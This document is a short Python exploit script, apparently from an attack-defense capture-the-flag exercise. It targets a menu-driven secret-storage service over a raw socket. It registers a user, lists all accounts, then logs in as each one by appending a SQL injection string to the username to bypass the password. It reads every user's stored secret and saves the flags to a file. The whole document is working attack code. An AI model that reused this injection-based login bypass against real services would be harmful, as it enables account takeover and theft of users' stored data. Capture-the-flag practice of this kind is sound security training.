import socket
import sys

if __name__ == '__main__':
    address = sys.argv[1]
    port = int(sys.argv[2])
    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    sock.connect((address, port))
    data = sock.recv(1024)
    sock.send(b"1\n")
    data = sock.recv(1024)
    sock.send(b"exp\n")
    data = sock.recv(1024)
    if data.decode("utf-8") == "Username alredy exists\n":
        print("Change user name.\n")
        sys.exit()
    sock.send(b"12345\n")
    data = sock.recv(1024)
    sock.send(b"3\n")
    usersdata = ""
    data = ""
    while True:        
        data = sock.recv(1024)
        data = data.decode("utf-8")
        usersdata = usersdata + data
        if "Commands.\n1.Show secret\n2.Store secret\n3.Show users\n4.Exit\n>" in data:
            break
    fulldata = usersdata[:len(usersdata) - len("Commands.\n1.Show secret\n2.Store secret\n3.Show users\n4.Exit\n>")]
    users = fulldata.split("\n")
    while "" in users:
        users.remove("")
    flags = []
    sock.close()
    print(users)
    for user in users:
        sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        if user == "exp":
            sock.close()
            continue
        sock.connect((address, port))
        data = sock.recv(1024)
        print(data.decode("utf-8"))
        sock.send(b"2\n")
        data = sock.recv(1024)
        print(data.decode("utf-8"))
        name = user + "' OR '1' = '1';--"
        print(name)
        sock.send(bytes(user + "' AND '1' = '1';--\n", "utf-8"))
        data = sock.recv(1024)
        print(data.decode("utf-8"))
        sock.send(b"123\n")
        data = sock.recv(1024)
        print(data.decode("utf-8"))
        sock.send(b"1\n")
        data = sock.recv(1024)
        data = data.decode("utf-8")
        print(data)
        flags.append(data.split("\n")[0])
        sock.send(b"4\n")
        sock.close()
    while "No secret." in flags:
        flags.remove("No secret.")
    with open(r'log_flags.txt', 'w') as fp:
        for flag in flags:
            fp.write("%s\n" % flag)
